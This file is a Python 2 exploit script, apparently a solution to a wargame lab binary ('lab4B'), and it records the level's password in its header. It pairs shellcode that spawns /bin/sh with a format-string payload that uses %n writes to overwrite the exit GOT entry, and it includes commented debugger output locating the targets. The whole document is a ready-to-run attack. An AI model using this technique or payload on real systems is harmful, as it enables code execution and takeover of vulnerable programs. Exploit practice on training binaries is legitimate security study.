# (python /tmp/sploit.py; cat;) | /levels/lab04/lab4B
#
# PASS: fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
#

import struct

# lab4B@warzone:/levels/lab04$ readelf --relocs ./lab4B
# --snip--
# Relocation section '.rel.plt' at offset 0x4cc contains 6 entries:
#  Offset     Info    Type            Sym.Value  Sym. Name
# 080499ac  00000207 R_386_JUMP_SLOT   00000000   printf
# 080499b0  00000307 R_386_JUMP_SLOT   00000000   fgets
# 080499b4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
# 080499b8  00000507 R_386_JUMP_SLOT   00000000   exit              <---- Overwrite
# 080499bc  00000607 R_386_JUMP_SLOT   00000000   strlen
# 080499c0  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
#
payload = (
"\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# gef> x/x 0x080499b8
# 0x80499b8 <exit@got.plt>:   0x08048566
# AFTER CRASH
#
# gef> search-pattern "\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73"
# [+] Searching '\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73' in memory
# [+] In (0xb7fd7000-0xb7fdb000), permission=rwx
#   0xb7fd8014 - 0xb7fd8038 ->  "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73[...]"

overwrite  = struct.pack('<L', 0x080499b8)
overwrite += "junk"
overwrite += struct.pack('<L', 0x080499ba)
overwrite += "junk"
overwrite += "aaaa"

buff  = overwrite
buff += payload
buff += " %08x" * 4
buff += "%32705x"  # 0x8014-0x005b+8 == 32705
buff += "%n"
buff += "%14313x"  # 0xb7fd-0x801c+8 == 14313
buff += "%n"

print buff
